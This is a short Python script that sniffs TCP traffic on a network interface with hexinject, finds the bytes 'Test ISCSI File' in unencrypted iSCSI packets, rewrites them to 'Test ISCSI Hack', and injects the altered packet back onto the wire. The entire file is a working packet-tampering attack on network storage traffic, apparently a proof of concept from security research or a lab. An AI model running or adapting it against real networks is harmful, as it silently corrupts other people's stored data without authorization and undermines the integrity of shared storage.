from scapy.all import *
import sys
import os
running = True
while(running):
	# -c 650 are the packets we want to sniff. 650 goes until test file
	packet_read = os.popen('hexinject -s -i eth0 -c 650 -f tcp').read()
	print packet_read + " *********************** "
	packet_list = packet_read.splitlines()
	for packet in packet_list:
		
		# below we look for the 'test iscsi file' in hex
		if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65' in packet):
			print "iscsi content file identified!"
			# we replace 'Test ISCSI File' with 'Test ISCSI Hack'
			packet = packet.replace('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65', '54 65 73 74 20 49 53 43 53 49 20 48 61 63 6B', 2) 
			#packet_file = open('packet', 'w')
			#packet_file.write(packet_read)
			print " packet modified: - - - " + packet
			# we inject the packets with the new modified packet
			os.system("echo '"  + packet + "' | hexinject -p -i eth0")
			running = False
